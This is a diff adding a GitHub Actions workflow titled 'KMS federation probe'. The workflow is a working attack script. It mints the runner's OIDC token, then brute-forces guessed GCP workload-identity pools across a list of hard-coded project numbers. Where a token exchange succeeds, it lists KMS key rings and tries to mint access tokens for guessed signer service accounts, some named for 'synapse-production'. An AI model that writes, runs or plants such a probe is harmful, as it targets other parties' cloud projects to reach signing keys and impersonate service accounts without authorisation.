@@ -1,0 +1,54 @@
+name: KMS federation probe
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: whoami-and-claims
+        run: |
+          set -u
+          echo "REPO=$GITHUB_REPOSITORY EVENT=$GITHUB_EVENT_NAME REF=$GITHUB_REF"
+          R=$(curl -sS --max-time 30 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
+          TOK=$(printf '%s' "$R" | jq -r '.value // empty')
+          echo "IDT_LEN=${#TOK}"
+          P=$(printf '%s' "$TOK" | cut -d. -f2 | tr '_-' '/+'); case $(( ${#P} % 4 )) in 2) P="$P==";; 3) P="$P=";; esac
+          echo "CLAIMS=$(printf '%s' "$P" | base64 -d 2>/dev/null)"
+      - name: gcp-wif-matrix
+        run: |
+          set -u
+          AUD0=sts.amazonaws.com
+          TRY="969676484546:github-pool:github 969676484546:github-pool:github-provider 969676484546:github-pool:github-oidc 969676484546:github-actions:github-provider 969676484546:github-wif:github 969676484546:github-oidc:github-provider 969676484546:synapse-production.svc.id.goog:synapse-production.svc.id.goog 892124123196:github-pool:github 892124123196:github:github-provider 892124123196:external:github 892124123196:github-wif:github 350330337821:github-pool:github 256538497032:github-pool:github 520807166293:github-pool:github 416470074811:github-pool:github"
+          for T in $TRY; do
+            NUM=${T%%:*}; rest=${T#*:}; POOL=${rest%%:*}; PROV=${rest#*:}
+            AUD="//iam.googleapis.com/projects/$NUM/locations/global/workloadIdentityPools/$POOL/providers/$PROV"
+            R=$(curl -sS --max-time 30 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$AUD")")
+            TOK=$(printf '%s' "$R" | jq -r '.value // empty')
+            if [ -z "$TOK" ]; then echo "MINT_FAIL $NUM $POOL $PROV :: $(printf '%s' "$R" | head -c 200)"; continue; fi
+            OUT=$(curl -sS --max-time 30 -w '\nHTTP=%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              --data-urlencode "audience=$AUD" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              --data-urlencode "subject_token=$TOK")
+            echo "WIF $NUM $POOL/$PROV :: $(printf '%s' "$OUT" | tr '\n' ' ' | head -c 330)"
+            AT=$(printf '%s' "$OUT" | head -1 | jq -r '.access_token // empty' 2>/dev/null)
+            if [ -n "$AT" ]; then
+              echo "  KMSKEYRINGS=$(curl -sS --max-time 30 -H "Authorization: Bearer $AT" "https://cloudkms.googleapis.com/v1/projects/$NUM/locations/-/keyRings?pageSize=20" | head -c 500)"
+              case $NUM in
+                892124123196) GSAS="signer@signer.iam.gserviceaccount.com kms@signer.iam.gserviceaccount.com signer@synapse-production.iam.gserviceaccount.com signer@synapse-prod.iam.gserviceaccount.com" ;;
+                969676484546) GSAS="signer@synapse-production.iam.gserviceaccount.com signer@synapse-prod.iam.gserviceaccount.com kms@synapse-production.iam.gserviceaccount.com" ;;
+                *) GSAS="signer@$NUM.iam.gserviceaccount.com" ;;
+              esac
+              for GSA in $GSAS; do
+                echo "  GENAC $GSA -> $(curl -sS --max-time 30 -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$GSA:generateAccessToken" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' | head -c 260)"
+                sleep 0.3
+              done
+            fi
+            sleep 0.4
+          done
+          echo "=== done ==="
